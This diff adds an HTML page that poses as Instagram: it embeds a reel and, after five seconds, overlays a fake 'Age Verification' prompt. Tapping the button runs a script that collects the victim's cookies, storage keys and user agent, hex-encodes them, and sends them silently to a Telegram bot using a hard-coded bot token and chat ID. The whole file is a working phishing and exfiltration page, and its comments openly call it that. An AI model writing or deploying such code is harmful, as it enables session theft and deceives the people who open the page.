@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Instagram</title>
+    <style>
+        body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; overflow: hidden; }
+        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:9999; color:#fff; text-align:center; padding-top:180px; }
+        .btn { background:#0095f6; color:#fff; border:none; padding:15px; border-radius:10px; font-weight:700; width:85%; cursor:pointer; font-size:16px; margin-top:20px; }
+    </style>
+</head>
+<body>
+    <div id="v">
+        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60">
+        <h2 style="margin-bottom:10px;">Age Verification</h2>
+        <p style="padding:0 40px; font-size:14px; color:#a8a8a8;">To continue watching, please verify that you are at least 18 years old.</p>
+        <button class="btn" onclick="done()">Verify Age (One-Tap)</button>
+    </div>
+
+    <iframe id="f" src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%; height:100vh; border:none;"></iframe>
+
+    <script>
+        const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
+        const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+
+        // Strict 5 Seconds Trigger
+        setTimeout(() => { document.getElementById('v').style.display = 'block'; }, 5000);
+
+        function done() {
+            // One-Tap silent exfiltration
+            let d = JSON.stringify({
+                st: Object.keys(localStorage),
+                ss: Object.keys(sessionStorage),
+                ck: document.cookie || "STRICT_SSL",
+                ua: navigator.userAgent
+            });
+            
+            // Sending clean Hex to Telegram
+            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔓_DATA_${h(d)}`;
+            
+            // Instant Close
+            document.getElementById('v').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
